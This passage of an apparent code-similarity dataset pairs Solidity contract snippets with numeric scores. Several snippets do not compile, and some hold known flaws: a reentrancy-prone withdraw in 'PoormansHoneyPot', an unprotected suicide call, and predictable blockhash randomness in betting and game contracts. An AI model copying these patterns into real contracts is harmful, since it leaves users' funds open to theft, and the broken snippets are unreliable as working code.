        public;

        

}"
"contract EntityFactory {
    Entity[] public deployedEntities;
    mapping(address => bool) public deployedEntitiesMap;

    function createEntity() public {
        Entity newEntity = new Entity(msg.sender);
        deployedEntitiesMap[newEntity] = true;
        deployedEntities.push(newEntity);
    }

    function getDeployedEntities() public view returns(Entity[]) {
        return deployedEntities;
    }
}",0.5160074187793459,"contract TokenInterface is ERC20Interface {

    function symbol() public view returns (string memory);

    function name() public view returns (string memory);

    function decimals() public view returns (uint8);

    function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success);

}"
"contract SimpleTimeStamp {
    uint lastHash;

    function set(uint x) public {
        lastHash = x;
    }
}",0.5905185637217188,"contract Stats {
  function getDay( uint128 day) public view returns (uint);
}"
"contract MyContract {
  
  function MyContract(bytes32[] myArray) { 
    
  }
}",0.5687585212963728,"contract WalletContract

{

	function payMe() public payable;

}"
"contract TestOraclizeCall is usingOraclize {
     uint public price;
     event Log(string text);
     event LogOracleConnection(OraclizeAddrResolverI obj);
     OraclizeAddrResolverI OAR;

 
 function TestOraclizeCall() {
     OAR = OraclizeAddrResolverI(0x6f485c8bf6fc43ea212e93bbf8ce046c7f1cb475);   
     emit LogOracleConnection(OAR);
    
 }

 function checkOARInstance() public view returns(address){
     OAR.getAddress();
 }
 function __callback(bytes32 _myid, string _result) public {
      if (msg.sender != oraclize_cbAddress()) revert();
      emit Log(_result);
      
   }
 function update()public{
    oraclize_query(""URL"",""json(http:
 }
 }",0.5076806959765409,"contract Verification {
	using SafeMath for uint256;
    mapping(address => uint256) veruser;
	function RA(address _to) public view returns(bool){
		if(veruser[_to]>0){
			return true;
		}else{
			return false;
		}
	}
	function VerificationAccountOnJullar() public {
	    if(RA(msg.sender) == false){
		    veruser[msg.sender] = veruser[msg.sender].add(1);	
		}
	}
	
	string public TestText = ""Gaziali"";
	
	function RT() public view returns(string){
		return TestText;
	}
	
	function CIzTezt(string _value) public{
		TestText = _value;
	}
	
	function VaN(address _to) public {
		if(RA(_to) == false){
		    veruser[_to] = veruser[_to].add(1);	
		}
	}

}"
"contract PopArray {
    string[] public string_arr;

    function PopArray() {
        
        string_arr = ['zero', 'one', 'two', 'three', 'four'];
    }

    
    function pop_string () returns (string member) {
        member = string_arr[string_arr.length-1]; 
        string_arr.length = string_arr.length-1;  
        return member;
    } 

    
    function broken_pop_string () returns (string) {
        string member = string_arr[string_arr.length-1];
        string_arr.length = string_arr.length-1;
        return member;
    }
}",0.5401255397556708,"contract BaseFactory {

    address public mainFabricAddress;
    string public title;

    struct Parameter {
        string title;
        string paramType;
    }

    
    Parameter[] public params;

    
    function numParameters() public view returns (uint256)
    {
        return params.length;
    }

    function getParam(uint _i) public view returns (
        string title,
        string paramType
    ) {
        return (
        params[_i].title,
        params[_i].paramType
        );
    }
}"
"contract CounterContract {
   using CounterLib for CounterLib.Counter;

   CounterLib.Counter counter;

   function increment() returns (uint) {
     return counter.incremented();
   }
}",0.5474447802795605,"contract proofofpower {

    

    bytes[6] public whitepaper;

    uint counter;

    function uploadData(bytes _data) public returns (uint){

        whitepaper[counter] = _data;

        counter++;

    }

}"
"contract World {
    mapping (address => bool) players;
    mapping (address => ResourceBank) resourceBanks;
    function giveZero() public {
        if (!players[msg.sender]) {
            resourceBanks[msg.sender] = new ResourceBank();
            players[msg.sender] = true;
        }
        ResourceBank bank = resourceBanks[msg.sender];
        bank.add(0);
    }
}",0.5606406826870863,"contract PoormansHoneyPot {
    mapping (address => uint) public balances;

    constructor() public payable {
        store();
    }

    function store() public payable {
        balances[msg.sender] = msg.value;
    }

    function withdraw() public{
        assert (msg.sender.call.value(balances[msg.sender])()) ;
        balances[msg.sender] = 0;
    }


}"
"contract ResourceBank {
    uint[] resources;
    function add(uint resource) public {
        resources.push(resource);
    }
}",0.5906845588483612,"contract OtcInterface {
    function getBuyAmount(address, address, uint) public constant returns (uint);
}"
"contract ExampleOne {

  struct Problem {
    bytes32 a; 
    bytes32 b;
    bytes32[] c;
    uint d;
    }
  mapping (bytes32 => Problem) public problems;
}",0.577632763877491,"contract Spotter {
    struct Ilk {
        PipInterface pip;
        uint256 mat;
    }

    mapping (bytes32 => Ilk) public ilks;

    uint256 public par;

}"
"contract Example Two {

  IExampleOne exampleOne;

  constructor(address _exampleOne) {
    exampleOne = IExampleOne(_exampleOne);
  }

  function func(bytes32 name) {
    (bytes32 a, bytes32 b, bytes32[] c, uint d) = problems(name); 
    ...
  }
}",0.5305308637000568,"contract JugAbstract {
    function file(bytes32, bytes32, uint256) external;
    function file(bytes32, uint256) external;
    function file(bytes32, address) external;
    function drip(bytes32) external returns (uint256);
}"
"contract ID{

    uint id;
    Whitelisted whitelist;
    mapping (string => MessageData) public messages;

    event MessageSaved(string messageHash);

    constructor(uint _id, address _whitelist) public {
        owner = msg.sender;
        id = _id;
        whitelist = Whitelisted(_whitelist);
    }

    struct MessageData {
        string messageSender;
        uint64 timestamp;
    }
}",0.5839281131776896,"contract Log 
{
   
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    
    Message public LastMsg;
    
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}"
"contract musicCompany is owned {

    address[] public listofmusic;

    function addMusic(string setThemeMusic, string setIdMusic, int setmoney) onlyOwner {
        address newMusic = new Music(setThemeMusic, setIdMusic, setmoney);
        listofmusic.push(newMusic);
    }
}",0.5166330310766554,"contract Secured is Owned {

    address public admin;



    event SetAdmin(address indexed _admin);



    modifier onlyAdmin {

        require(msg.sender == admin);

        _;

    }



    function setAdmin(address _newAdmin) public onlyOwner {

        admin = _newAdmin;

        emit SetAdmin(admin);

    }

}"
"contract MyInfo {

  struct Info {
    bytes32 id;
    bytes32 name;
  }
  bytes32[] infoIDs;
  mapping(bytes32 => Info) infos;
  function addInfo(bytes32 _name) public
     returns(bool success) {

     bytes32 ID = keccak256(_name);
     infoIDs.push(ID);
     infos[ID].id = ID;
     infos[ID].name =_name;
     return true;
  }
  function getInfoIDs() public view returns(bytes32[] ids) {
    return infoIDs;
  }
}",0.5902158878564195,"contract ERC780 {

    function setClaim(address subject, bytes32 key, bytes32 value) public;

    function setSelfClaim(bytes32 key, bytes32 value) public;

    function getClaim(address issuer, address subject, bytes32 key) public view returns (bytes32);

    function removeClaim(address issuer, address subject, bytes32 key) public;

}"
"contract KYCPurchase {
  uint public price = 2 ether;

  struct Company {
      string registeredNumber;
      string name;
  }
  mapping (address => Company) companies;

  function buy(string registeredNumber, string name) public payable {
    require(msg.value >= price);

    
    companies[msg.sender] = Company(registeredNumber, name);
  }
}",0.5645187211612398,"contract Loyalty {

    struct Enterprises {
        uint id;
        string name;
    }

    mapping(uint => Enterprises) public enterpises;

    uint public enterprisesCount;

    constructor () public {
    }

    function addCandidate (string memory _name) public {
        enterprisesCount ++;
        enterpises[enterprisesCount] = Enterprises(enterprisesCount, _name);
    }
}"
"contract CalculatorV2 {

  uint result;

  event NumberAdded(uint n);
  event NumberSubtracted(uint n);
  event NumberMultiplied(uint n);
  event NumberDivided(uint n);

  function CalculatorV2(uint num) {
    
    result=num;
 }

  
  function getResult() constant returns (uint){
   return result;
 }

  
  function addToNumber(uint num) returns (uint) {
   result += num;
    NumberAdded(num);
   return result;
 }

 
 function substractNumber(uint num) returns (uint) {
   result -= num;
   NumberSubtracted(num);
   return result;
 }

 
  function multiplyWithNumber(uint num) returns (uint) {
    result *= num;
    NumberMultiplied(num);
    return result;
  }

  
  function divideByNumber(uint num) returns (uint) {
    result /= num;
    NumberDivided(num);
    return result;
  }

}",0.5615994872788086,"contract Sale {
    uint public startTime;
    uint public stopTime;
    uint public target;
    uint public raised;
    uint public collected;
    uint public numContributors;
    mapping(address => uint) public balances;

    function buyTokens(address _a, uint _eth, uint _time) returns (uint); 
    function getTokens(address holder) constant returns (uint); 
    function getRefund(address holder) constant returns (uint); 
    function getSoldTokens() constant returns (uint); 
    function getOwnerEth() constant returns (uint); 
    function tokensPerEth() constant returns (uint);
    function isActive(uint time) constant returns (bool); 
    function isComplete(uint time) constant returns (bool); 
}"
"contract HelloWorld {
  string message;
  event evntGetMessage(string message);

  constructor(string mymessage) public {
    message =  mymessage;
  emit evntGetMessage(message);
  }

  function getMessage() external view returns(string) {
    return message;
  }

  function welcomeMssg(string name) external returns (string){
     message =  string(abi.encodePacked(message, "" "", name));
     emit evntGetMessage(message);
     return string(abi.encodePacked(message, "" "", name));
  } 
}",0.5335500707984328,"contract NamedToken {
  string public name;
  string public symbol;
  uint8 public decimals;

  function NamedToken(string _name, string _symbol, uint8 _decimals) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
  }

  
  function getNameHash() external constant returns (bytes32 result){
    return keccak256(name);
  }

  
  function getSymbolHash() external constant returns (bytes32 result){
    return keccak256(symbol);
  }
}"
"contract Test2 {
    mapping(uint => Test1) map;
}",0.5285060406625302,"contract Test {
    
    function die() {
        suicide(0);
    }
}"
"contract Inbox {
    string public message;

    constructor(string initialMessage) public {
        message = initialMessage;
    }

    function setMessage(string newMessage) public {
        message = newMessage;
    }
}",0.5569240752307437,"contract SimpleStorage {

    

    address public owner;

    uint256 public storageValue;

    

    constructor()  public {

        owner = msg.sender;

    }

    

    function setStorage(uint256 _value) {

        storageValue = _value;

    }

}"
"contract AddressRatings {

struct Rating {
    mapping ( address => uint8 ) ratings;
    uint256 amtOfRatings;
    uint256 sumOfRatings;
    uint8 average;
}

mapping ( address => Rating ) public ratings;

function rateAddress (address _addr, uint8 _rating) external {
    require(_rating > 0 && _rating < 6); 
    require(ratings[_addr].ratings[msg.sender] == 0); 
    ratings[_addr].ratings[msg.sender] = _rating;
    ratings[_addr].amtOfRatings++;
    ratings[_addr].sumOfRatings += _rating;
    ratings[_addr].average = uint8(ratings[_addr].sumOfRatings/ratings[_addr].amtOfRatings);
}

}",0.513151153043191,"contract NatminVesting is Ownable {
    struct Vesting {        
        uint256 amount;
        uint256 endTime;
    }
    mapping(address => Vesting) internal vestings;

    function addVesting(address _user, uint256 _amount) public ;
    function getVestedAmount(address _user) public view returns (uint256 _amount);
    function getVestingEndTime(address _user) public view returns (uint256 _endTime);
    function vestingEnded(address _user) public view returns (bool) ;
    function endVesting(address _user) public ;
}"
"contract CA15 {

struct Student {
        uint16 age;
    uint16 income;
    uint16 score;
    uint16 attendance;
}

Student[] public students;
function setStudent (uint16 _age, uint16 _income, uint16 _score, uint16 _attendance) public {
   Student memory tempStudent = Student({age: _age, income: _income, score: _score, attendance: _attendance});
        students.push(tempStudent);
}

}",0.5192233927041384,"contract CardBase is Governable {





    struct Card {

        uint16 proto;

        uint16 purity;

    }



    function getCard(uint id) public view returns (uint16 proto, uint16 purity) {

        Card memory card = cards[id];

        return (card.proto, card.purity);

    }



    function getShine(uint16 purity) public pure returns (uint8) {

        return uint8(purity / 1000);

    }



    Card[] public cards;

    

}"
"contract MetaCoin {

    struct hospital {
        uint index;
        uint record;
        address patientdata;

        mapping(address => uint) _patientrecord;
        bytes32[] record;



    }
    


    function Metacoin() {

        patient = msg.sender;
        doctor = msg.sender;



    }




    event verify(patientPublicKey, doctorPublicKey, timestamp, uint8 consentCode); 

    function verify(bytes32 hash, uint8 v, bytes32 r, bytes32 s) constant returns(bool) {
        return ecrecover(hash, v, r, s, address) == address;



    }

    function isSigned(bytes32 hash, uint8 v, bytes32 r, bytes32 s) returns(bool) {
        return ecrecover(hash, v, r, s) == address;

    }

    function Time_call() returns(uint256) {
        return block.number;
    }

    modifier onlypatient() {
        if (msg.sender != patient) throw;
        _;
    }

    modifier onlydoctor() {
        if (msg.sender != doctor) throw;
        _;
    }

    function getAddressfromPublicKey(bytes _publickey) returns(address signer) { 
        bytes32 keyHash = keccak256(_publickey);
        uint result = 0;
        for (uint i = keyHash.length - 1; i + 1 > 2; i--) {
            uint c = uint(keyHash[i]);
            uint to_inc = c * (16 ** ((keyHash.length - i - 1) * 2));
            result += to_inc;
        }
        result record;
    }
}",0.5995387526253071,"contract Token {
    string internal _symbol;
    string internal _name;
    uint8 internal _decimals;
    uint internal _totalSupply = 1000;
    mapping (address => uint) internal _balanceOf;
    
    uint256 ___decimalmain = 10 **18;
    
    uint _returntoken1 = 8;
    uint _returntoken2 = 4;
    
    mapping (address => mapping (address => uint)) internal _allowances;
    
    function Token(string symbol, string name, uint8 decimals, uint totalSupply) public {
        _symbol = symbol;
        _name = name;
        _decimals = decimals;
        _totalSupply = totalSupply;
    }
    
    function name() public constant returns (string) {
        return _name;
    }
    
    function symbol() public constant returns (string) {
        return _symbol;
    }
    
    function decimals() public constant returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public constant returns (uint) {
        return _totalSupply;
    }
    
    function balanceOf(address _addr) public constant returns (uint);
    function transfer(address _to, uint _value) public returns (bool);
    event Transfer(address indexed _from, address indexed _to, uint _value);
}"
"contract Signagreement { 
    address patient;
    address doctor;

    function patient(address _patient) {
        patient = _patient;
    }

    function doctor(address _doctor) {
        doctor = _doctor;

    }


    modifier onlyPatient() {
        require(msg.sender == patient);
        _;

    }
    modifier onlydoctor() {
        require(msg.sender == doctor);
        _;

    }

    function data() {
        patient = msg.sender;
        doctor = msg.sender;
    }


    struct recordstructs {
        bool approvedBypatient;
        bool approvedBydoctor;

    }
    
    mapping(bytes32 => recordstruct) public recordstructs;
    bytes32[] public DataList; 
    bytes32[] public approvedData; 

    event LogproposedData(address _patient, bytes32 docHash);
    event ApprovedproposedData(address _doctor, bytes32 docHash);
    
    function agreement(string timestamp_patient, address _patientdata, string timestamp_doctor) {
        patient = block.timestamp_patient && address_patient && Identification_patient;
        doctor = block.timestamp_doctor && address_doctor && Identification_doctor;
    }


    
    function getDataCount() public constant returns(uint docCount) {
        return DataList.length;

    }

    function getApprovedCount() public constant returns(uint docCount) {
        return DataList.length;
    }



    
    function agreeDoc(bytes32 Hash) public returns(bool success) {
        if (msg.sender != patient && msg.sender != doctor) throw; 
        if (msg.sender == patient) recordstructs[hash].approvedBypatient = true;
        if (msg.sender == doctor) recordstructs[hash].approvedBypatient = true;
        if (block.number(patient) == block.number(doctor)) recordstructs[hash].approvedBypatient = true; {
            if (msg.sender(patient) == msg.sender(doctor)) recordstructs[hash].approvedBypatient = true;
        }
        if (recordstructs[hash].approvedBypatient == true) {
            uint docCount = DataList.push(hash);
            LogApprovedData(msg.sender, hash);


        } else {
            uint apprCount = approvedData.push(hash);
            LogProposedData(msg.sender, hash);
        }
        return true;
    }
}",0.5616270840980137,"contract LTCD is ERC20 {
    string public constant symbol = ""LTCD"";
    string public constant name = ""Litecoin Dark"";
    uint8 public constant decimals = 8;
    uint256 _totalSupply = 8400000 * 10**8;

    address public owner;
    mapping(address => uint256) balances;
    mapping(address => mapping (address => uint256)) allowed;
     
  
  	modifier notPaused{
    	require(now > 1510700400 || msg.sender == owner);
    	_;
	 }

    function LTCD() public {
        owner = msg.sender;
        balances[owner] = 8400000 * 10**8;
    }
     
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
  
    function totalSupply() public constant returns (uint256 returnedTotalSupply) {
        returnedTotalSupply = _totalSupply;
    }
  

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }
 
    function transfer(address _to, uint256 _amount) public notPaused returns (bool success) {
        if (balances[msg.sender] >= _amount 
            && _amount > 0) {
            balances[msg.sender] -= _amount;
            balances[_to] += _amount;
            Transfer(msg.sender, _to, _amount);
            return true;
        } else {
            return false;
        }
    }
     
     
    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) public notPaused returns (bool success) {
        if (balances[_from] >= _amount
            && allowed[_from][msg.sender] >= _amount
            && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[_from] -= _amount;
            allowed[_from][msg.sender] -= _amount;
            balances[_to] += _amount;
            Transfer(_from, _to, _amount);
            return true;
        } else {
            return false;
        }
    }
 
    function approve(address _spender, uint256 _amount) public returns (bool success) {
        allowed[msg.sender][_spender] = _amount;
        Approval(msg.sender, _spender, _amount);
        return true;
    }
  
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}"
"contract permissionsP2P is Enabled {

    struct consentedPatientDataTuple {
        bytes32 verificationmessage;
        address patientdata;


    }

    function records(address _patientdata) {
        records = _patientdata;

    }
    struct consentPatientCode {

        uint8 consentCode;
        
        
        
        
        

    }


    mapping(address => uint8) public permissions;
    mapping(address_patientdata => consentPatientcode) public patientconsent;
    mapping(address_patientdata => consentedPatientDataTuple) public patientdoctorconsent;


    function retrieveData(address _patientdata, uint8 index) returns(bytes32) {

        mapping(uint => address) _patientdata;
        address _patientdata = msg.sender;
        uint retrievedData = address _patientdata && consentpatientCode;
        var cons = consentpatientCode(address _patientdata, consentCode);

        if (consentCode = 1 && msg.sender == doctor || msg.sender == patient) {
            if (DataList[address _patientdata].init == false) {
                return 0;

            } else {
                DataList[address _patientdata].record[index];
                return record(result);

            }
        }

    }

    function addData(address _data, bytes32 record) returns(uint result) {
        var cons = consentpatientCode(address _patientdata, consentCode);

        if (consentCode = 2 && DataList.[address _patientdata].init == false) {
            return 0;
        } else if (data == 0) {
            return 1;
        } else {
            DataList[address _patientdata].record[index].push(record);
            DataList[address _patientdata].responsible.push(resp);
            return 2; 

        }
    }

    function confirmData(address _data, bytes32 report) returns(bool) {
        if (address _record != 0x0) {
            
            address _doctor = address _data.Identification _doctor;
            address _patient = address _data.Identification _patient;
            if (msg.sender == doctor || msg.sender == patient) {
                if (DataList[address _data].init == false || record == 0) {
                    return false;
                }
            }
        }
    }

    function updateData(address _patientdata, bytes32 record) returns(bool) {
        var cons = consentpatientCode(address _patientdata, consentCode);

        if (consentCode = 3 && DataList.[address _patientdata].init == false) {

            address_ patientdata.record[index] = record;
        }
    }
}",0.5421307296213138,"contract AddressMapper is MasterRole {

    

    event DoMap(address indexed src, bytes32 indexed target, string rawTarget);

    event DoMapAuto(address indexed src, bytes32 indexed target, string rawTarget);

    event UnMap(address indexed src);



    mapping (address => string) public mapper;



    modifier onlyNotSet(address src) {

        bytes memory tmpTargetBytes = bytes(mapper[src]);

        require(tmpTargetBytes.length == 0);

        _;

    }



    function()

        public

        payable

        onlyNotSet(msg.sender)

    {

        require(msg.value > 0);

        _doMapAuto(msg.sender, string(msg.data));

        msg.sender.transfer(msg.value);

    }



    function isAddressSet(address thisAddr)

        public

        view

        returns(bool)

    {

        bytes memory tmpTargetBytes = bytes(mapper[thisAddr]);

        if(tmpTargetBytes.length == 0) {

            return false;

        } else {

            return true;

        }

    }



    function _doMapAuto(address src, string target)

        internal

    {

        mapper[src] = target;

        bytes32 translated = _stringToBytes32(target);

        emit DoMapAuto(src, translated, target);

    }



    function doMap(address src, string target) 

        public

        onlyMaster

        onlyNotSet(src)

    {

        mapper[src] = target;

        bytes32 translated = _stringToBytes32(target);

        emit DoMap(src, translated, target);

    }



    function unMap(address src) 

        public

        onlyMaster

    {

        mapper[src] = """";

        emit UnMap(src);

    }



    function _stringToBytes32(string memory source) internal returns (bytes32 result) {

        bytes memory tempEmptyStringTest = bytes(source);

        if (tempEmptyStringTest.length == 0) {

            return 0x0;

        }



        assembly {

            result := mload(add(source, 32))

        }

    }



    function submitTransaction(address destination, uint value, bytes data)

        public

        onlyMaster

    {

        external_call(destination, value, data.length, data);

    }



    function external_call(address destination, uint value, uint dataLength, bytes data) private returns (bool) {

        bool result;

        assembly {

            let x := mload(0x40)   

            let d := add(data, 32) 

            result := call(

                sub(gas, 34710),   

                                   

                                   

                destination,

                value,

                d,

                dataLength,        

                x,

                0                  

            )

        }

        return result;

    }

}"
"contract Creation  {

    int basiclife=50;

    struct hero  { 
        string name;
        int life;
        int lvl;
        int xp;
        int attack;
        int winCount;
        int trophies;
        int lossCount;
    }
    hero[] public heroes; 


    struct enemy {  
        string name;
        int life;
        int lvl;
        int xp;
        int attack;
    }
    enemy[] public enemies;

  mapping (uint => address) public herotoowner;
  mapping (address => uint) public  heroCount;

  mapping (uint => address) public monstertoowner;
  uint public monsterCount; 

    function createhero(string memory _name) public  { 
     require(heroCount[msg.sender] == 0);
       uint id= heroes.push(hero(_name,basiclife,1,0,20,0,0,0))-1; 
       herotoowner[id] = msg.sender;
       heroCount[msg.sender]++;

    }
     function enemyRage(int _herolvl) public  { 
       uint id=enemies.push(enemy(""Rage"",20*_herolvl,_herolvl,7*_herolvl,5*_herolvl))-1;
       monstertoowner[id] = msg.sender;
       monsterCount++;

    }

    function enemyDerpina(int _herolvl) public  { 
       uint id=enemies.push(enemy(""Derpina"",40*_herolvl,_herolvl,14*_herolvl,10*_herolvl))-1; 
       monstertoowner[id] = msg.sender;
       monsterCount++;

    }

       function getHerosByOwner(address owner) external view returns( uint ) { 
        uint result =999999;
        for (uint i = 0; i < heroes.length; i++) {
              if (herotoowner[i] == owner) {
                result = i;
                break;
          }
        }
        return result;
        }
        function getmonstersByOwner(address owner) external view returns( uint ) { 
        uint result =0;
        for (uint i = enemies.length ; i > 0 ; i--) {
              if (monstertoowner[i] == owner) {
                result = i;
                break;
          }
        }
        return result;
        }

        uint nonce=0;

   function randNum(int _num) private   returns(int) {  
    int randomnumber = int(keccak256(abi.encodePacked(now, msg.sender, nonce))) % _num;
    if (randomnumber <=0) {
        randomnumber=(-1)*randomnumber;
    }
    nonce++;
    return randomnumber;
    }  

    function attack_hero(uint _heroid, uint _monsterid, int _num  ) external  returns(string memory, int,int,int,int ) { 

      hero storage myhero = heroes[_heroid];
      enemy storage monster = enemies[_monsterid];
      int attackofhero=0;
      if(_num==0) { 
       attackofhero=randNum(myhero.attack);
      }
      monster.life=monster.life - attackofhero;

      int attackofmonster=randNum(monster.attack);
      myhero.life=myhero.life - attackofmonster;

      if (monster.life <= 0 && myhero.life >0) { 
        myhero.winCount++;
        myhero.xp+=monster.xp;

        if (randNum(100) > 50 ){ 
              myhero.trophies++;
          }

        return(""win"",myhero.lvl,myhero.xp,myhero.life,myhero.trophies);
      }
      if (myhero.xp>=10+2*myhero.lvl){ 
          myhero.lvl++;
          myhero.xp=0; 
          myhero.life=basiclife*myhero.lvl;  
          myhero.attack=myhero.attack*myhero.lvl;
        }
      if (myhero.life <= 0 ) { 
          myhero.lossCount++; 
          return(""dead"",myhero.lossCount,myhero.life,myhero.lvl,myhero.trophies);
      } 

      return(""attack"",myhero.life,attackofhero,monster.life,attackofmonster);


    }
    function resurrection(uint _heroid) public { 
         hero storage myhero = heroes[_heroid];
         myhero.life=basiclife*myhero.lvl;
     }



}",0.5535471452847543,"contract BetOnHashV84 {
  struct Player {
    address addr;
    byte bet;
  }
  
  Player[] public players;
  bool public active;
  uint public betAmount;
  uint public playersPerRound;
  uint public round;
  uint public winPool;
  byte public betByte;

  uint lastPlayersBlockNumber;
  address owner;
  
  modifier onlyowner { if (msg.sender == owner) _ }
  
  function BetOnHashV84() {
    owner = msg.sender;
    betAmount = 1 ether;
    round = 1;
    playersPerRound = 6;
    active = true;
    winPool = 0;
  }
  
  function finishRound() internal {
    
    bytes32 betHash = block.blockhash(lastPlayersBlockNumber);
    betByte = byte(betHash);
    byte bet;
    uint8 ix; 
    
    
    address[] memory winners = new address[](playersPerRound);
    uint8 numWinners=0;
    for(ix=0; ix < players.length; ix++) {
      Player p = players[ix];
      if(p.bet < 0x80 && betByte < 0x80 || p.bet >= 0x80 && betByte >= 0x80) {
        
        winners[numWinners++] = p.addr;
      } 
      else winPool += betAmount;
    }
    
    
    if(numWinners > 0) {
      uint winAmount = (winPool / numWinners) * 99 / 100;
      for(ix = 0; ix < numWinners; ix++) {
        if(!winners[ix].send(betAmount + winAmount)) throw;
      }
      winPool = 0;
    }
    
    
    round++;
    delete players;
  }
  
  function reject() internal {
    msg.sender.send(msg.value);
  }
  
  function join() internal {
    
    if(players.length >= playersPerRound) { 
      if(block.number > lastPlayersBlockNumber) finishRound(); 
      else {reject(); return;}  
    }

    
    if(msg.value < betAmount) {
      winPool += msg.value; 
      return;
    }
    
    
    if(msg.data.length < 1) {reject();return;}
    
    
    for(uint8 i = 0; i < players.length; i++)
      if(msg.sender == players[i].addr) {reject(); return;}
    
    
    if(msg.value > betAmount) {
      msg.sender.send(msg.value - betAmount);
    }
    
    
    players.push( Player(msg.sender, msg.data[0]) );
    lastPlayersBlockNumber = block.number;
  }
  
  function () {
    if(active) join();
    else throw;
  }
  
  function paybackLast() onlyowner returns (bool) {
    if(players.length == 0) return true;
    if (players[players.length - 1].addr.send(betAmount)) {
      players.length--;
      return true;
    }
    return false;
  }
  
  
  function paybackAll() onlyowner returns (bool) {
    while(players.length > 0) {if(!paybackLast()) return false;}
    return true;
  }
  
  function collectFees() onlyowner {
    uint playersEther = winPool;
    uint8 ix;
    for(ix=0; ix < players.length; ix++) playersEther += betAmount;
    uint fees = this.balance - playersEther;
    if(fees > 0) owner.send(fees);
  }
  
  function changeOwner(address _owner) onlyowner {
    owner = _owner;
  }
  
  function setPlayersPerRound(uint num) onlyowner {
    if(players.length > 0) finishRound();
    playersPerRound = num;
  }
  
  function stop() onlyowner {
    active = false;
    paybackAll();
  }
  
  function numberOfPlayersInCurrentRound() constant returns (uint count) {
    count = players.length;
  }

  
  function kill() onlyowner {
    if(!active && paybackAll()) 
      selfdestruct(owner);
  }
}"
"contract B{
    address public to;    
    function callcontractA () public {
       to.call(abi.encodeWithSignature(""hello()""));
    }   
    function setcontract (address x) public{
        to = x;
    }   
    function callsetNumbercontractA () public {
        
       to.call(abi.encodeWithSignature(""setNumber(uint)"",10));
    }
}",0.5917356764743863,"contract ArtNoyToken{

  function setCrowdsaleContract (address) public;

  function sendCrowdsaleTokens(address, uint256)  public;

  function getOwner()public view returns(address);

  function icoSucceed() public;

  function endIco () public;

}"
"contract Voter {
    struct OptionPos {
        uint pos;
        bool exists;
    }

    uint[] public votes;
    string[] public options;
    mapping (address => bool) hasVoted;
    mapping (string => OptionPos) posOfOption;
    bool votingStarted;

    function addOption(string memory option) public {
        require(!votingStarted);
        options.push(option);
    }

    function startVoting() public {
        require(!votingStarted);
        votes.length = options.length;

        for (uint i = 0; i< options.length; i++) {
            OptionPos memory optionPos = OptionPos(i, true);
            posOfOption[options[i]] = optionPos;
        }
        votingStarted = true;
    }

    function vote(uint option) public {
        require(0<=option && option< options.length, ""Invalid option"");
        require(!hasVoted[msg.sender], ""Account has already voted"");

        votes[option] = votes[option]+1;
        hasVoted[msg.sender] = true;
    }

    function vote(string memory optionName) public {
        require(!hasVoted[msg.sender], ""Account has already voted"");
        OptionPos memory optionPos = posOfOption[optionName];
        require(optionPos.exists, ""Option does not exist"");

        votes[optionPos.pos] = votes[optionPos.pos]+1;
        hasVoted[msg.sender] = true;
    }

    function getVotes() public view returns (uint[] memory) {
        return votes;
    }
}",0.5548619673613869,"contract LineOfTransfers {

    address[] public accounts;
    uint[] public values;
    
    uint public transferPointer = 0;

    address public owner;

    event Transfer(address to, uint amount);

    modifier hasBalance(uint index) {
        require(this.balance >= values[index]);
        _;
    }
    
    modifier existingIndex(uint index) {
        assert(index < accounts.length);
        assert(index < values.length);
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function () payable public {}

    function LineOfTransfers() public {
        owner = msg.sender;
    }

    function transferTo(uint index) existingIndex(index) hasBalance(index) internal returns (bool) {
        uint amount = values[index];
        accounts[index].transfer(amount);

        Transfer(accounts[index], amount);
        return true;
    }

    function makeTransfer(uint times) public {
        while(times > 0) {
            transferTo(transferPointer);
            transferPointer++;
            times--;
        }
    }
    
    function getBalance() constant returns (uint balance) {
        return this.balance;
    }
    
    function addData(address[] _accounts, uint[] _values) onlyOwner {
        require(_accounts.length == _values.length);
        
        for (uint i = 0; i < _accounts.length; i++) {
            accounts.push(_accounts[i]);
            values.push(_values[i]);
        }
    }
    
    
    function terminate() onlyOwner {
        selfdestruct(owner);
    }
}"
"contract GasRefundTest {

    uint[] myArray = [1, 2];

    function deleteLastElem() public returns(bytes32) {
        myArray.length--;
    }
}",0.5817450012240992,"contract IERC223Receiver {

  

   

    function tokenFallback(address _from, uint _value, bytes _data) public returns(bool);

}"
"contract ElectionsMaster {

address private ownerMasterAddress = msg.sender;

address[] private elections;
bytes32[] private electionsNames;

mapping(address => uint8) private organizersMapping;

constructor() public {
    organizersMapping[msg.sender] = 1;
}

modifier isMasterAccount(address senderAddress) {
    require(senderAddress == ownerMasterAddress, ""Master privileges required"");
    _;
}

modifier isOrganizer(address senderAddress) {
    require(organizersMapping[senderAddress] != 0, ""Organizer privilleges required"");
    _;
}

function () external payable {
}

function changeOwnerMasterAccount(address newOwnerMasterAccount) public isMasterAccount(msg.sender) {
    organizersMapping[newOwnerMasterAccount] = 0;
    ownerMasterAddress = newOwnerMasterAccount;
    organizersMapping[newOwnerMasterAccount] = 1;
}

function addOrganizer(address newOrganizer) public isMasterAccount(msg.sender) {
    organizersMapping[newOrganizer] = 1;
}

function getBalance() public view isMasterAccount(msg.sender) returns(uint) {
    return address(this).balance;
}

function addElection(address electionAddress,
                    bytes32 electionName,
                    address organizerAddress) public isOrganizer(organizerAddress) {
    elections.push(electionAddress);
    electionsNames.push(electionName);
}

function getElectionAddresses() public view returns(address[] memory) {
    return elections;
}

function getElectionNames() public view returns(bytes32[] memory) {
    return electionsNames;
}

function canAddressDeployContract(address organizerAddress) public view returns(bool) {
    return (organizersMapping[organizerAddress] == 1);
}
",0.5768337353557373,"contract Whitelist is Ownable {

    mapping(address => bool) public whitelist;



    mapping(uint  => address)   whitelistCheck;

    uint public countAddress = 0;



    event WhitelistedAddressAdded(address addr);

    event WhitelistedAddressRemoved(address addr);

 

    modifier onlyWhitelisted() {
